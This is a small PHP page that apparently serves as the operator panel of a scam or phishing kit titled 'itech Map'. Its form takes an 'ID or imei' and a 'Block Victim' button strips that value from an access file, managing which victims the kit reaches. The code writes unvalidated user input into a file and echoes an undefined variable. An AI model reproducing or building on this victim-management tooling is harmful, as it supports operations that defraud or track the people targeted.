<?php 
echo "\n\n<!DOCTYPE html>\n<html >\n<head>\n  <meta charset=\"UTF-8\">\n  <title>itech Map 2020</title>\n  \n      <link rel=\"stylesheet\" href=\"style1.css\">\n<meta name=\"viewport\" content=\"initial-scale=1, maximum-scale=1\">\n  \n</head>\n\n<body>\n<br><br>\n  <h1>itech Map 2019</h1>\n\n<div class=\"btn-container\">\n\n<h2 style=\"color:#000\" >Write ID or imei to Block</h2>\n\n<br><br>\n         <form name=\"form\" method=\"post\">\n            <input type=\"text\" name=\"text_box\" style=\"font-size:14pt;height:30px;width:300px;\"/>\n            <br><br>\n            <input type=\"submit\" id=\"search-submit\" class=\"btn\" value=\"Block Victim\" />\n        </form>\n        \t\n\t\t";
if (isset($_POST["text_box"])) {
    $a = $_POST["text_box"];
    $filename = "../access.txt";
    $string_to_replace = $a;
    $replace_with = "";
    replace_string_in_file($filename, $string_to_replace, $replace_with);
    echo "<br><h3><font color=\"#13232e\">" . $threadinfo . " link Blocked Successfully</font></h3>";
}
echo "\n\n\n</div>\n\n  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>\n\n  \n</body>\n</html>\n";
function replace_string_in_file($filename, $string_to_replace, $replace_with)
{
    $content = file_get_contents($filename);
    $content_chunks = explode($string_to_replace, $content);
    $content = implode($replace_with, $content_chunks);
    file_put_contents($filename, $content);
}
?>